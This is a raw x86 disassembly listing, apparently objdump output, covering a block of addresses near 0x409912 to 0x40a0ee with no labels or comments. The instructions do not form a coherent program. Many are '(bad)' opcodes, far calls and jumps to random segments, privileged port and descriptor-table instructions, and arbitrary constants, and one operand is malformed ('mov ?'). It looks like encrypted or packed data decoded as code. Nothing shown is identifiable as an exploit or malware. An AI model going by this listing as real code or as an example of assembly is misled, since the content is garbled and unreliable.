  409912:	cmp    al,BYTE PTR [esi+esi*1]
  409915:	call   0x809d:0xee47ac3c
  40991c:	mov    bh,0x24
  40991e:	jl     0x40997e
  409920:	inc    ebp
  409921:	dec    BYTE PTR [ebx-0xf9ac7d0]
  409927:	add    edi,DWORD PTR [edi]
  409929:	jae    0x409955
  40992b:	xor    al,0xc1
  40992d:	adc    eax,0xdb600437
  409932:	jae    0x409999
  409934:	gs sbb eax,0xbec9a4ec
  40993a:	aad    0x2d
  40993c:	xchg   ebx,eax
  40993d:	shl    DWORD PTR [ecx-0x46],0xfb
  409941:	inc    esi
  409942:	add    BYTE PTR [ebx],bh
  409944:	xchg   esp,eax
  409945:	cmp    al,0xa0
  409947:	mov    ebx,0x3f48e64a
  40994c:	mov    edx,DWORD PTR [esi-0x30]
  40994f:	xchg   ecx,eax
  409950:	pop    edx
  409951:	inc    esi
  409953:	imul   edi,DWORD PTR [ecx-0x60b7b45b],0xdab9450c
  40995d:	add    ecx,ebx
  40995f:	cdq    
  409960:	push   ebx
  409961:	lods   eax,DWORD PTR ds:[esi]
  409962:	push   ecx
  409963:	jbe    0x4099dc
  409965:	mov    dl,BYTE PTR [edi+0x5d0a8967]
  40996b:	jecxz  0x409905
  40996d:	mov    ebp,edi
  40996f:	push   eax
  409970:	mov    esi,0x2758fb60
  409975:	push   es
  409976:	mov    eax,0xbef500fe
  40997b:	fs add eax,0xd9048f12
  409981:	add    eax,0x49c43a89
  409986:	int    0x6e
  409988:	in     al,dx
  409989:	dec    esp
  40998a:	xchg   edx,eax
  40998b:	jp     0x4099a9
  40998d:	adc    esi,ecx
  40998f:	jmp    FWORD PTR [eax-0x2d92517c]
  409995:	xchg   edx,eax
  409996:	adc    eax,0xe9d205f5
  40999b:	lea    ecx,[ecx]
  40999d:	xchg   esp,eax
  40999e:	cmp    ch,BYTE PTR [edx-0x6567702d]
  4099a4:	jae    0x409973
  4099a6:	cmp    BYTE PTR [edx-0xb],al
  4099a9:	or     al,0x29
  4099ab:	sar    BYTE PTR [eax+ecx*8],1
  4099ae:	mov    cs,WORD PTR [edi+edx*1-0x6b]
  4099b2:	jno    0x409988
  4099b4:	and    edx,eax
  4099b6:	fs out 0x31,al
  4099b9:	xor    eax,0x3271fe4a
  4099be:	jns    0x409984
  4099c0:	retf   0x87d0
  4099c3:	inc    eax
  4099c4:	push   ss
  4099c5:	lldt   WORD PTR [edi-0x6d]
  4099c9:	add    edx,DWORD PTR [edx-0x3f]
  4099cc:	push   ebp
  4099cd:	nop
  4099ce:	data16 int3 
  4099d0:	cmp    BYTE PTR [esi+0xbd5eff0],ah
  4099d6:	xchg   ecx,eax
  4099d7:	inc    ebp
  4099d8:	retf   
  4099d9:	sbb    edi,DWORD PTR [eax+ebx*1-0x3d]
  4099dd:	addr16 popa 
  4099df:	inc    edx
  4099e0:	push   ds
  4099e1:	stc    
  4099e2:	test   eax,0x7ac737a3
  4099e7:	mov    ecx,0xdc80583c
  4099ec:	call   0xbe65:0xe4dd4588
  4099f3:	fs xchg edi,eax
  4099f5:	xor    esi,ecx
  4099f7:	jno    0x409a24
  4099f9:	mov    eax,ds:0x82e48a89
  4099fe:	xor    cl,BYTE PTR [eax]
  409a00:	jmp    0x4099ad
  409a02:	(bad)  
  409a03:	fistp  DWORD PTR [ecx+0x38c21a85]
  409a09:	cmp    ecx,0xfffffffd
  409a0c:	out    dx,al
  409a0d:	push   esp
  409a0e:	shl    BYTE PTR [edi+eax*8+0x1d60fff5],0x81
  409a16:	and    eax,0x89b772c4
  409a1b:	cmp    bl,BYTE PTR [edi]
  409a1d:	cmp    DWORD PTR [edi+0x40],ebp
  409a20:	cmovnp ebp,DWORD PTR [edx+0x633a4e63]
  409a27:	nop
  409a28:	pop    esi
  409a29:	and    al,0x55
  409a2b:	loop   0x409a92
  409a2d:	cmp    eax,0xde685516
  409a32:	dec    eax
  409a33:	jmp    0x4099be
  409a35:	xor    bl,BYTE PTR [eax-0x3f]
  409a38:	ja     0x409a80
  409a3a:	clc    
  409a3b:	mov    ebx,0xe8c02bf8
  409a40:	push   ebp
  409a41:	mul    BYTE PTR [ebx-0x6e40f6eb]
  409a47:	lock add cl,bh
  409a4a:	mov    dh,0x70
  409a4c:	lea    esp,[esi]
  409a4e:	ins    BYTE PTR es:[edi],dx
  409a4f:	jne    0x409aba
  409a51:	push   ecx
  409a52:	imul   eax,DWORD PTR [edx],0xc620f720
  409a58:	int    0x27
  409a5a:	xor    esp,DWORD PTR [edx]
  409a5c:	xor    DWORD PTR [edi],eax
  409a5e:	adc    al,0xe
  409a60:	repz popa 
  409a62:	sbb    eax,DWORD PTR [esi]
  409a64:	clc    
  409a65:	sbb    eax,0x1191bd2c
  409a6a:	add    eax,0x5e4fad9f
  409a6f:	push   cs
  409a70:	cmp    edx,DWORD PTR [ecx+0x60]
  409a73:	test   al,0x75
  409a75:	push   ecx
  409a76:	pop    es
  409a77:	add    BYTE PTR [esi-0x30],cl
  409a7a:	sub    al,0xdd
  409a7c:	fwait
  409a7d:	lods   al,BYTE PTR ds:[esi]
  409a7e:	js     0x409a7a
  409a80:	dec    ebx
  409a81:	jno    0x409a3b
  409a83:	and    al,0xa3
  409a85:	mov    bl,0x98
  409a87:	jp     0x409a52
  409a89:	jmp    0x409a4d
  409a8b:	pop    ebp
  409a8c:	push   ebp
  409a8d:	xor    eax,0xa6ed25d1
  409a92:	mov    ch,0x76
  409a94:	xchg   ebp,eax
  409a95:	mov    ds:0xe571847a,al
  409a9a:	js     0x409a2f
  409a9c:	(bad)  
  409a9d:	jle    0x409aa8
  409a9f:	xor    eax,0x3b70f145
  409aa4:	ins    BYTE PTR es:[edi],dx
  409aa5:	add    al,0x4b
  409aa7:	mov    dh,0x86
  409aa9:	fs popa 
  409aab:	iret   
  409aac:	xchg   ecx,eax
  409aad:	push   ds
  409aae:	add    al,0x83
  409ab0:	jno    0x409a60
  409ab2:	dec    eax
  409ab3:	lods   al,BYTE PTR ds:[esi]
  409ab4:	adc    esp,DWORD PTR [ebp+0x3b916b1]
  409aba:	inc    ebx
  409abb:	push   esp
  409abc:	call   0xbd8f:0x2d6ef24f
  409ac3:	adc    DWORD PTR [ecx+ecx*4-0x2e],ecx
  409ac7:	mov    ah,0x91
  409ac9:	dec    edi
  409aca:	dec    eax
  409acb:	loope  0x409ab0
  409acd:	(bad)  
  409ace:	push   ss
  409acf:	out    dx,eax
  409ad0:	adc    bh,dh
  409ad2:	fsub   st(1),st
  409ad4:	aad    0x92
  409ad6:	mov    dh,0xe0
  409ad8:	or     dh,BYTE PTR [edx+esi*8+0x11]
  409adc:	jae    0x409ade
  409ade:	jle    0x409ae0
  409ae0:	mov    esi,0xcdac4cc9
  409ae5:	nop
  409ae6:	nop
  409ae7:	mov    edx,0x755d8e58
  409aec:	add    cl,bl
  409aee:	xor    eax,0xfb2582a7
  409af3:	push   es
  409af4:	mov    fs,WORD PTR [edx-0x32]
  409af7:	stos   DWORD PTR es:[edi],eax
  409af8:	push   cs
  409af9:	push   ds
  409afa:	pop    ss
  409afb:	arpl   sp,sp
  409afd:	sbb    BYTE PTR [ebx],0x3
  409b00:	mov    dh,0x45
  409b02:	inc    ebp
  409b03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b04:	aad    0xc
  409b06:	scas   eax,DWORD PTR es:[edi]
  409b07:	rcr    BYTE PTR [edi],1
  409b09:	inc    esp
  409b0a:	inc    eax
  409b0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b0c:	icebp  
  409b0d:	adc    DWORD PTR [esi-0x4c2a6e3b],ecx
  409b13:	xchg   esp,eax
  409b14:	ret    
  409b15:	int    0x9d
  409b17:	loope  0x409b3c
  409b19:	(bad)  
  409b1a:	jge    0x409ade
  409b1c:	cmp    cl,BYTE PTR [edi]
  409b1e:	aad    0xcf
  409b20:	fimul  DWORD PTR [edi+0x6ff9a75c]
  409b26:	fisubr WORD PTR [esi]
  409b28:	jge    0x409ad6
  409b2a:	push   eax
  409b2b:	jmp    0xf3474676
  409b30:	pop    edi
  409b31:	(bad)  
  409b32:	dec    ebp
  409b33:	loopne 0x409b07
  409b35:	ja     0x409b84
  409b37:	sbb    al,0xd8
  409b39:	mov    ebx,0x3de139f
  409b3e:	aaa    
  409b3f:	push   ecx
  409b40:	add    eax,0xeae7c954
  409b45:	and    ah,BYTE PTR [eax-0x77165489]
  409b4b:	mov    al,0x88
  409b4d:	add    ecx,0x4d
  409b50:	rcr    DWORD PTR [eax+0x79],cl
  409b53:	jmp    0x409baa
  409b55:	mov    ch,0xd2
  409b57:	ja     0x409b2f
  409b59:	outs   dx,DWORD PTR ds:[esi]
  409b5a:	add    ch,BYTE PTR [ebp+ebp*1-0x547fa1c4]
  409b61:	fnsave [ebx-0x45]
  409b64:	push   ds
  409b65:	xor    BYTE PTR [esi+0x750f71f9],cl
  409b6b:	sub    BYTE PTR [edx],0xe1
  409b6e:	adc    cl,0x6b
  409b71:	mov    dl,0x3b
  409b73:	and    BYTE PTR [eax+0x3],dl
  409b76:	and    al,0x2c
  409b78:	mov    ah,0x99
  409b7a:	es jae 0x409b42
  409b7d:	add    dh,BYTE PTR [edi-0x47300538]
  409b83:	loop   0x409b06
  409b85:	and    eax,0xbb5301aa
  409b8a:	mov    ds:0x6675ab6b,al
  409b8f:	jno    0x409b69
  409b91:	addr16 xchg esp,eax
  409b93:	mov    ebp,0xf2f67298
  409b98:	mov    esi,0x1c280c82
  409b9d:	fwait
  409b9e:	iretw  
  409ba0:	push   ecx
  409ba1:	loope  0x409b44
  409ba3:	xchg   esi,eax
  409ba4:	in     al,dx
  409ba5:	iret   
  409ba6:	(bad)  
  409ba7:	xor    DWORD PTR [esi+0x146b3645],ebx
  409bad:	fild   DWORD PTR [edx+ecx*8+0x226ca158]
  409bb4:	push   ebx
  409bb5:	arpl   WORD PTR [esi-0xe6f1fc1],si
  409bbb:	pusha  
  409bbc:	sub    dh,BYTE PTR [ecx-0x38]
  409bbf:	ret    
  409bc0:	pop    edx
  409bc1:	cmp    BYTE PTR [esp+eax*2-0x692a5d82],dh
  409bc8:	sbb    eax,edi
  409bca:	mov    eax,edx
  409bcc:	test   al,0x39
  409bce:	shl    eax,0x47
  409bd1:	mov    al,0xc
  409bd3:	push   ss
  409bd4:	mov    ds:0xc832b90d,al
  409bd9:	rcl    edx,cl
  409bdb:	std    
  409bdc:	arpl   WORD PTR [esi+0x4d],dx
  409bdf:	fwait
  409be0:	popa   
  409be1:	enter  0xef04,0x91
  409be5:	ror    ebx,0x6a
  409be8:	jnp    0x409c38
  409bea:	dec    esp
  409beb:	dec    ebp
  409bec:	bound  esp,QWORD PTR [edi+ebx*1]
  409bef:	sbb    DWORD PTR [eax+eax*4],ebx
  409bf2:	cs sub bh,al
  409bf5:	cmp    edx,edi
  409bf7:	pop    ecx
  409bf8:	dec    BYTE PTR [edx+edi*1+0x7114b8a2]
  409bff:	arpl   ax,dx
  409c01:	pop    es
  409c02:	fdivrp st(3),st
  409c04:	inc    edi
  409c05:	sub    DWORD PTR [ecx-0x118e1dc7],0xa635c9d8
  409c0f:	fcmove st,st(3)
  409c11:	push   0xffffff82
  409c13:	(bad)  
  409c14:	xor    eax,0x5addbd24
  409c19:	inc    eax
  409c1a:	rcr    DWORD PTR [esi+0x726ab66a],cl
  409c20:	call   0xc41c5469
  409c25:	(bad)  
  409c26:	imul   esi,DWORD PTR [eax-0x2f],0x848ae96e
  409c2d:	dec    ecx
  409c2e:	gs mov ecx,0x5b228f64
  409c34:	xchg   ebx,eax
  409c35:	dec    esi
  409c36:	push   edx
  409c37:	mov    BYTE PTR ds:0xa8af760d,dl
  409c3d:	dec    eax
  409c3e:	jl     0x409be0
  409c40:	fnstenv [ecx]
  409c42:	pop    eax
  409c43:	mov    eax,0xd5b5627e
  409c48:	ret    
  409c49:	fist   DWORD PTR [eax-0x7a]
  409c4c:	push   eax
  409c4d:	pop    ebx
  409c4e:	jae    0x409cc5
  409c50:	imul   esi,DWORD PTR [edi+0x18dc69cc],0xbbc32047
  409c5a:	jne    0x409c3b
  409c5c:	mov    WORD PTR [ecx],cs
  409c5e:	fwait
  409c5f:	shl    BYTE PTR [esi+0x50],0xfe
  409c63:	int    0x45
  409c65:	in     eax,dx
  409c66:	add    al,0x73
  409c69:	out    dx,eax
  409c6a:	push   esp
  409c6b:	les    esp,FWORD PTR [eax-0x4]
  409c6e:	add    ecx,DWORD PTR [ecx]
  409c70:	inc    esp
  409c71:	add    BYTE PTR ds:[ebp+0x4c],bl
  409c75:	add    al,0xd0
  409c77:	imul   esp,eax,0x9ac109a0
  409c7d:	or     al,0x7c
  409c7f:	xchg   ebp,eax
  409c80:	mov    ds:0xffb61354,eax
  409c85:	push   es
  409c86:	mov    BYTE PTR ss:[edi-0x14],dh
  409c8a:	(bad)  
  409c8b:	xor    bh,ch
  409c8d:	jae    0x409ca6
  409c8f:	in     al,dx
  409c90:	mov    ecx,0xe9386353
  409c95:	test   DWORD PTR [ebp-0x5f],0x45f16212
  409c9c:	cli    
  409c9d:	xchg   edx,eax
  409c9e:	aad    0x9d
  409ca0:	ret    0x3c7
  409ca3:	push   edi
  409ca4:	push   ebp
  409ca5:	popf   
  409ca6:	fcom   st(3)
  409ca8:	xchg   esp,eax
  409ca9:	xor    edi,DWORD PTR [edx-0x7ff90c9f]
  409caf:	test   edi,0xa6aa7dc4
  409cb5:	cwde   
  409cb6:	rol    dl,0xd0
  409cb9:	icebp  
  409cba:	sub    eax,0x1814a311
  409cbf:	push   edi
  409cc0:	lods   al,BYTE PTR ds:[esi]
  409cc1:	push   cs
  409cc2:	sub    DWORD PTR [edx+0x64f56040],0x5e
  409cc9:	inc    esp
  409cca:	add    ch,BYTE PTR [ebx+0x7e248c2c]
  409cd0:	mov    dh,0x7f
  409cd2:	loopne 0x409d12
  409cd4:	call   0xb796cd28
  409cd9:	stos   DWORD PTR es:[edi],eax
  409cda:	add    ch,BYTE PTR [ecx-0x1]
  409cdd:	aam    0x43
  409cdf:	sahf   
  409ce0:	or     ebx,ebp
  409ce2:	addr16 inc ebp
  409ce4:	mov    dh,0xf9
  409ce6:	lds    ebp,FWORD PTR [ebx-0x5785b126]
  409cec:	mov    ah,0xf5
  409cee:	mov    bl,0xba
  409cf0:	cli    
  409cf1:	fiadd  WORD PTR [esi]
  409cf3:	inc    ebp
  409cf4:	mov    esp,0x7189070d
  409cf9:	or     eax,0x59d9fdec
  409cfe:	push   0x48
  409d00:	cli    
  409d01:	pop    eax
  409d02:	ja     0x409d2a
  409d04:	(bad)  
  409d06:	loope  0x409cf3
  409d08:	(bad)  
  409d09:	xchg   ecx,eax
  409d0a:	lea    esp,cs:[esi-0x21]
  409d0e:	xor    ah,dh
  409d10:	js     0x409d50
  409d12:	out    0x42,eax
  409d14:	call   0xcefd:0xe6a37c4e
  409d1b:	pop    esp
  409d1c:	jg     0x409ca6
  409d1e:	enter  0x8be5,0xc0
  409d22:	ror    edx,1
  409d24:	fadd   QWORD PTR [ecx-0x3fadb2dd]
  409d2a:	xor    al,0xd7
  409d2c:	(bad)  
  409d2f:	xor    eax,0x8cbe6a95
  409d34:	add    eax,0x3f171969
  409d39:	inc    ebx
  409d3a:	icebp  
  409d3b:	mov    ch,0xeb
  409d3d:	jae    0x409d9e
  409d3f:	lea    ebx,[edi]
  409d41:	test   BYTE PTR ss:[ecx+0x371cfa68],ch
  409d48:	ret    0xcaa1
  409d4b:	dec    edi
  409d4c:	cld    
  409d4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d4e:	mov    BYTE PTR [ebx],dl
  409d50:	(bad)  
  409d53:	(bad)  
  409d54:	xchg   DWORD PTR [ecx+0x3493d9d0],edx
  409d5a:	inc    ecx
  409d5b:	cmp    al,BYTE PTR [esi]
  409d5d:	inc    ebp
  409d5e:	mov    esi,0xa29fdbe0
  409d63:	add    al,0x9d
  409d65:	mov    al,ds:0xd0fc76d9
  409d6a:	aad    0x7d
  409d6c:	mov    dl,0xe5
  409d6e:	sbb    dh,BYTE PTR [eax+esi*2-0x12f4667a]
  409d75:	retf   0x52b9
  409d78:	jo     0x409d9a
  409d7a:	ret    
  409d7b:	xor    edi,DWORD PTR [ebp-0x43]
  409d7e:	xor    DWORD PTR [eax-0x2372b6de],esi
  409d84:	jo     0x409d63
  409d86:	lds    eax,FWORD PTR [ecx-0x79cbab30]
  409d8c:	mov    ss,WORD PTR [edx*2-0x7c75d6c5]
  409d93:	sbb    dl,BYTE PTR [esi-0x35]
  409d96:	les    edi,FWORD PTR [ecx-0x4e]
  409d99:	lods   al,BYTE PTR ds:[esi]
  409d9a:	shl    dl,1
  409d9c:	or     edx,DWORD PTR [edx-0x481da1a0]
  409da2:	pop    ecx
  409da3:	leave  
  409da4:	mov    al,0x3c
  409da6:	dec    ebx
  409da7:	mov    bh,0x88
  409da9:	jae    0x409d82
  409dab:	mov    cl,0x1b
  409dad:	ins    BYTE PTR es:[edi],dx
  409dae:	xchg   esp,eax
  409daf:	bound  esi,QWORD PTR [ebp+0x328150fe]
  409db5:	push   esi
  409db6:	push   0x5f
  409db8:	adc    dh,BYTE PTR [edi+ecx*4+0x5a]
  409dbc:	mov    edi,0x79c9d76c
  409dc1:	push   es
  409dc2:	repz (bad) 
  409dc4:	pusha  
  409dc5:	and    edi,eax
  409dc7:	cwde   
  409dc8:	and    eax,esp
  409dca:	in     al,0x5a
  409dcc:	out    0xca,eax
  409dce:	test   eax,0xa9edff93
  409dd3:	jg     0x409e3d
  409dd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dd6:	loopne 0x409e49
  409dd8:	adc    eax,0xcfc5321b
  409ddd:	jne    0x409e34
  409ddf:	out    0xab,eax
  409de1:	add    dl,al
  409de3:	fs lahf 
  409de5:	pop    ecx
  409de6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409de7:	push   ds
  409de8:	jg     0x409da2
  409dea:	mov    edi,0xcb2e0151
  409def:	aad    0x15
  409df1:	adc    al,bl
  409df3:	cmc    
  409df4:	mov    al,0x31
  409df6:	(bad)  
  409df7:	pop    ds
  409df8:	outs   dx,DWORD PTR ds:[esi]
  409df9:	arpl   WORD PTR [edx],di
  409dfb:	(bad)  [edi+0x58c0c18c]
  409e01:	pop    esp
  409e02:	jb     0x409da7
  409e04:	sub    ecx,DWORD PTR [eax+eax*1]
  409e07:	scas   al,BYTE PTR es:[edi]
  409e08:	xchg   DWORD PTR [edi-0x2755e86],edi
  409e0e:	(bad)  
  409e0f:	add    cl,BYTE PTR [edx]
  409e11:	les    esi,FWORD PTR [ebx-0x2389c0e0]
  409e17:	test   BYTE PTR [esp+esi*4],0x0
  409e1b:	pushf  
  409e1c:	jg     0x409e71
  409e1e:	mov    ecx,0x9383de08
  409e23:	into   
  409e24:	test   al,0x49
  409e26:	arpl   WORD PTR [ebp-0x34b65ce8],ax
  409e2c:	sbb    eax,0xfa971299
  409e31:	mov    ch,0x23
  409e33:	add    al,0xa
  409e35:	test   eax,0x2e0d605a
  409e3a:	xor    BYTE PTR [eax-0x18287824],0xce
  409e41:	xchg   edx,eax
  409e42:	dec    ebx
  409e43:	jg     0x409e2c
  409e45:	push   eax
  409e46:	xor    bl,BYTE PTR ds:0xc6b4b582
  409e4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e4d:	mov    cl,0x38
  409e4f:	cmp    ebp,esp
  409e51:	out    0x75,al
  409e53:	fnsave [ebx]
  409e55:	cmc    
  409e56:	fs icebp 
  409e58:	loope  0x409e98
  409e5a:	ins    BYTE PTR es:[edi],dx
  409e5b:	out    dx,eax
  409e5c:	jge    0x409e80
  409e5e:	nop
  409e5f:	shr    BYTE PTR [ebx+0x68],cl
  409e62:	push   esp
  409e63:	popa   
  409e64:	faddp  st(2),st
  409e66:	test   al,0x37
  409e68:	mov    ebp,0x6e047e49
  409e6d:	sbb    cl,BYTE PTR [eax-0x2]
  409e70:	jle    0x409e38
  409e72:	cmp    eax,0x1c75f33e
  409e77:	inc    eax
  409e78:	jl     0x409e95
  409e7a:	adc    BYTE PTR [eax+edi*2+0x2ed70a8d],bl
  409e81:	out    0x35,al
  409e83:	jae    0x409e4f
  409e85:	sahf   
  409e86:	js     0x409e0f
  409e88:	sbb    dh,BYTE PTR ds:0x4695e45
  409e8e:	adc    ecx,DWORD PTR [edx+0x24]
  409e91:	in     eax,0x7f
  409e93:	pusha  
  409e94:	jg     0x409e31
  409e96:	inc    esp
  409e97:	pushf  
  409e98:	retf   
  409e99:	jmp    0x9af9:0x4c925687
  409ea0:	loop   0x409ead
  409ea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ea3:	cmp    al,0xc6
  409ea5:	mov    eax,0xa50acd5e
  409eaa:	ins    DWORD PTR es:[edi],dx
  409eab:	pop    DWORD PTR [esp+ebx*8-0x59]
  409eaf:	dec    esp
  409eb0:	jle    0x409eb3
  409eb2:	fdivp  st(4),st
  409eb4:	out    dx,al
  409eb5:	fldenv [esi]
  409eb7:	rol    BYTE PTR [ebx+0xd],cl
  409eba:	add    DWORD PTR [ebx+0x1dfc8626],ebp
  409ec0:	fadd   QWORD PTR [eax]
  409ec2:	cmc    
  409ec3:	and    eax,0x9819c4d3
  409ec8:	jecxz  0x409e67
  409eca:	push   es
  409ecb:	inc    esp
  409ecc:	cmp    al,0x52
  409ece:	sbb    eax,0x8808082c
  409ed3:	int3   
  409ed4:	daa    
  409ed5:	outs   dx,BYTE PTR ds:[esi]
  409ed6:	push   ss
  409ed7:	add    ch,al
  409ed9:	sub    al,0x33
  409edb:	(bad)  
  409edc:	iret   
  409edd:	mov    dl,0xcd
  409edf:	mov    eax,0x816b810d
  409ee4:	mov    esi,0x75807c
  409ee9:	dec    edx
  409eea:	and    BYTE PTR [ecx+0x48],ah
  409eed:	std    
  409eee:	jns    0x409ed0
  409ef0:	jb     0x409ead
  409ef2:	jb     0x409eb8
  409ef4:	neg    eax
  409ef6:	push   0x49fcd37f
  409efb:	aad    0x9e
  409efd:	cmp    al,0x30
  409eff:	sbb    DWORD PTR [edi+0x64],0x4a
  409f03:	inc    DWORD PTR [edi]
  409f05:	dec    ebp
  409f06:	pusha  
  409f07:	sbb    eax,0x9317c7fd
  409f0c:	sbb    al,bh
  409f0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f0f:	fisttp DWORD PTR [ecx+eax*2]
  409f12:	les    esp,FWORD PTR [esi+0x7c]
  409f15:	and    eax,0x9fb46c9b
  409f1a:	sub    eax,0xa5813eb2
  409f1f:	ins    DWORD PTR es:[edi],dx
  409f20:	jecxz  0x409f17
  409f22:	lea    edi,[ebp-0x1004b0de]
  409f28:	fnstcw WORD PTR [edx+0xa]
  409f2b:	cld    
  409f2c:	dec    edi
  409f2d:	push   ebp
  409f2e:	pop    es
  409f2f:	inc    ecx
  409f30:	shl    BYTE PTR [ecx],1
  409f32:	or     ebx,0x2dbb348c
  409f38:	imul   esi,ebp,0x72326abf
  409f3e:	imul   edi,eax,0x78
  409f41:	dec    eax
  409f42:	shr    bh,1
  409f44:	cs test eax,0xf926e050
  409f4a:	add    eax,0x3feca65f
  409f4f:	add    edi,DWORD PTR [ebx+0x771a1d8e]
  409f55:	xor    BYTE PTR [eax+0x40],ah
  409f58:	and    DWORD PTR ds:0x3897fe84,esp
  409f5e:	mov    ecx,0xc1f8bc24
  409f63:	fistp  QWORD PTR [ecx+0x3734cf76]
  409f69:	in     eax,dx
  409f6a:	cmp    edi,ecx
  409f6c:	sahf   
  409f6d:	jle    0x409fbd
  409f6f:	(bad)  
  409f71:	jmp    0xf471585a
  409f76:	test   eax,0xa6e8a748
  409f7b:	iret   
  409f7c:	jle    0x409fce
  409f7e:	mov    edi,0x4dd4eb54
  409f83:	outs   dx,BYTE PTR ds:[esi]
  409f84:	push   ebp
  409f86:	sub    eax,0x7d2b0c20
  409f8b:	sub    dh,bl
  409f8d:	mov    eax,0x6040edeb
  409f92:	ins    DWORD PTR es:[edi],dx
  409f93:	lds    ecx,FWORD PTR [ecx+0x5c]
  409f96:	jns    0x409f53
  409f98:	daa    
  409f99:	jecxz  0x409ff9
  409f9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f9c:	jae    0x409f84
  409f9e:	mov    ebp,0x5a1986b3
  409fa3:	retf   
  409fa4:	rol    BYTE PTR [ecx],cl
  409fa6:	outs   dx,BYTE PTR ds:[esi]
  409fa7:	stos   DWORD PTR es:[edi],eax
  409fa8:	aaa    
  409fa9:	int3   
  409faa:	jo     0x409fa2
  409fac:	lea    edi,[edx-0x7b]
  409faf:	add    edi,ebp
  409fb1:	and    BYTE PTR [ebx-0x5fc99454],dh
  409fb7:	pop    edi
  409fb8:	inc    edi
  409fb9:	cwde   
  409fba:	idiv   BYTE PTR [esi]
  409fbc:	cmp    ebp,esi
  409fbe:	inc    edx
  409fbf:	stc    
  409fc0:	add    DWORD PTR [edi-0x36ef4153],esi
  409fc6:	xor    DWORD PTR [eax],eax
  409fc8:	mov    al,ds:0xd45b02d4
  409fcd:	jl     0x409f69
  409fcf:	xchg   ecx,eax
  409fd0:	daa    
  409fd1:	mov    ds:0x6330d464,al
  409fd6:	lds    edx,FWORD PTR [ecx+0x6a18eb2b]
  409fdc:	int    0xc
  409fde:	jnp    0x409fd6
  409fe0:	fiadd  WORD PTR [edx-0x2f569f4c]
  409fe6:	add    BYTE PTR [esi+esi*2-0x36],cl
  409fea:	inc    ebx
  409feb:	mov    BYTE PTR ds:0x6003ff8d,cl
  409ff1:	out    dx,eax
  409ff2:	int3   
  409ff3:	cs push 0xffffff98
  409ff6:	dec    eax
  409ff7:	cmp    bh,BYTE PTR [eax-0x78820256]
  409ffd:	(bad)  
  409ffe:	(bad)
  40a001:	shl    BYTE PTR [edi-0x1930f0ae],0xc1
  40a008:	pop    esi
  40a009:	pusha  
  40a00a:	loope  0x409fcf
  40a00c:	in     eax,0x89
  40a00e:	mov    edx,0xd632a9bc
  40a013:	test   dl,dl
  40a015:	aad    0xb4
  40a017:	shl    BYTE PTR [ebx],0x52
  40a01a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a01b:	icebp  
  40a01c:	pusha  
  40a01d:	test   ebx,ebx
  40a01f:	and    BYTE PTR [edi-0x41f1a1ad],bl
  40a025:	pop    edx
  40a026:	cmc    
  40a027:	and    eax,0x62bec1e5
  40a02c:	std    
  40a02d:	mov    bh,0xbb
  40a02f:	pop    ds
  40a030:	test   al,0xd8
  40a032:	mov    BYTE PTR [eax],0xd4
  40a035:	jl     0x40a096
  40a037:	fwait
  40a038:	and    edi,esp
  40a03a:	mov    WORD PTR [edi+edx*2],cs
  40a03d:	sahf   
  40a03e:	leave  
  40a03f:	mov    bl,0x12
  40a041:	loop   0x40a03f
  40a043:	ss jne 0x40a089
  40a046:	hlt    
  40a047:	xor    ecx,0xffffff83
  40a04a:	sbb    al,0x49
  40a04c:	out    dx,eax
  40a04d:	push   eax
  40a04e:	into   
  40a04f:	fist   DWORD PTR [eax+ebp*8]
  40a052:	mov    ?,WORD PTR ds:0xf059d363
  40a058:	js     0x409ff8
  40a05a:	call   0xe152:0x8fc1267b
  40a061:	xor    al,0xa6
  40a063:	mov    dl,0xb1
  40a065:	mov    al,BYTE PTR [ebp+0x1fba1487]
  40a06b:	push   eax
  40a06c:	mov    ds:0x727baa20,eax
  40a071:	ret    
  40a072:	test   eax,0x4282888c
  40a077:	mov    edx,DWORD PTR [esi]
  40a079:	stos   DWORD PTR es:[edi],eax
  40a07a:	ins    BYTE PTR es:[edi],dx
  40a07b:	push   ecx
  40a07c:	fdivr  DWORD PTR [ebx+0x52]
  40a07f:	xor    BYTE PTR [edi],0x88
  40a082:	call   0x9f87:0x52cf7780
  40a089:	(bad)  
  40a08b:	mov    dl,0x7b
  40a08d:	mov    ds:0x6fe8a18a,al
  40a092:	push   ds
  40a093:	stos   BYTE PTR es:[edi],al
  40a094:	daa    
  40a095:	pop    es
  40a096:	and    BYTE PTR [eax+0x3f],dh
  40a099:	std    
  40a09a:	mov    eax,0x261cbf6f
  40a09f:	pop    ss
  40a0a0:	mov    bl,0x1e
  40a0a2:	jle    0x40a0ac
  40a0a4:	sahf   
  40a0a5:	dec    edi
  40a0a6:	or     esp,esi
  40a0a8:	xchg   DWORD PTR [esp+ebp*1],esi
  40a0ab:	lods   al,BYTE PTR ds:[esi]
  40a0ac:	dec    esp
  40a0ad:	test   DWORD PTR [ecx+eiz*4+0x4f],esp
  40a0b1:	push   eax
  40a0b2:	sbb    al,0xd3
  40a0b4:	(bad)  
  40a0b5:	repnz cmc 
  40a0b7:	sub    eax,DWORD PTR [esi]
  40a0b9:	aam    0x78
  40a0bb:	out    0x75,eax
  40a0bd:	imul   edx,DWORD PTR [ebp-0x793f42b0],0x33d81c9f
  40a0c7:	pop    eax
  40a0c8:	sub    DWORD PTR [eax+0x2f31803b],esi
  40a0ce:	addr16 leave 
  40a0d0:	daa    
  40a0d1:	xchg   DWORD PTR [esi+0x4c],edi
  40a0d4:	stos   BYTE PTR es:[edi],al
  40a0d5:	stos   BYTE PTR es:[edi],al
  40a0d6:	rcr    DWORD PTR [edi+esi*2],1
  40a0d9:	aam    0x3a
  40a0db:	mov    dh,0xe9
  40a0dd:	push   eax
  40a0de:	outs   dx,DWORD PTR ds:[esi]
  40a0df:	or     dh,BYTE PTR [ecx+0x7e]
  40a0e2:	fsub   DWORD PTR [edi]
  40a0e4:	ins    DWORD PTR es:[edi],dx
  40a0e5:	mov    ecx,0xfcd33e9a
  40a0ea:	iret   
  40a0eb:	sar    ecx,0x84
  40a0ee:	or     ecx,DWORD PTR [edx]
